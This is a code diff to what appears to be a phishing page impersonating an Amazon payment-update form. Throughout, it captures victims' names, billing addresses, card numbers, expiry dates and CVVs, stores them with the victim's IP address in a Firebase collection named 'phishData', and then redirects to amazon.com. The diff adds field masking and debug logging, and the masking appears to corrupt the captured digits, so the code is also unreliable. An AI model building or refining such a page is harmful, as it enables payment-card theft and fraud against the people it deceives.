@@ -100,7 +100,7 @@
             </div>
             <div class="form-group">
                 <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <input type="text" id="cardNumber" placeholder="**** **** **** ****" maxlength="19" required>
             </div>
             <div class="row">
                 <div class="form-group">
@@ -113,7 +113,7 @@
                 </div>
                 <div class="form-group">
                     <label for="cvv">CVV</label>
-                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                    <input type="password" id="cvv" placeholder="***" maxlength="4" required>
                 </div>
             </div>
             <div class="checkbox">
@@ -184,12 +184,25 @@
             document.getElementById('billingCountry').value = country || '';
         });
 
+        // Mask card number
         document.getElementById('cardNumber').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').slice(0, 19);
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) {
+                value = '**** **** **** ' + value.slice(-4);
+            } else {
+                value = '**** **** **** ****'.slice(0, value.length * 2 + 3 * (value.length > 0 ? Math.floor((value.length - 1) / 4) : 0)) + value;
+            }
+            e.target.value = value;
+        });
+
+        // Mask CVV
+        document.getElementById('cvv').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\d/g, '*');
         });
 
         document.getElementById('paymentForm').addEventListener('submit', async (e) => {
             e.preventDefault();
+            console.log('Form submitted');
             const recaptchaResponse = grecaptcha.getResponse();
             if (!recaptchaResponse) {
                 document.getElementById('errorMessage').style.display = 'block';
@@ -206,10 +219,10 @@
             const billingZip = document.getElementById('billingZip').value;
             const billingCountry = document.getElementById('billingCountry').value;
             const cardName = document.getElementById('cardName').value;
-            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\D/g, ''); // Unmask for storage
             const expMonth = document.getElementById('expMonth').value;
             const expYear = document.getElementById('expYear').value;
-            const cvv = document.getElementById('cvv').value;
+            const cvv = document.getElementById('cvv').value.replace(/\*/g, ''); // Unmask for storage
 
             if (!fullName || !billingAddress || !billingCity || !billingState || !billingZip || !billingCountry || cardNumber.length < 13 || cvv.length < 3) {
                 document.getElementById('loading').style.display = 'none';
@@ -219,6 +232,7 @@
             }
 
             try {
+                console.log('Sending to Firebase...');
                 await addDoc(collection(db, "phishData"), {
                     type: "amazon_payment_update",
                     fullName: fullName,
@@ -235,10 +249,12 @@
                     timestamp: new Date().toISOString(),
                     ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)
                 });
+                console.log('Success, redirecting...');
                 setTimeout(() => {
                     window.location.href = "https://www.amazon.com";
                 }, 3000);
             } catch (error) {
+                console.error('Firebase error:', error);
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('errorMessage').style.display = 'block';
                 document.getElementById('submitBtn').disabled = false;
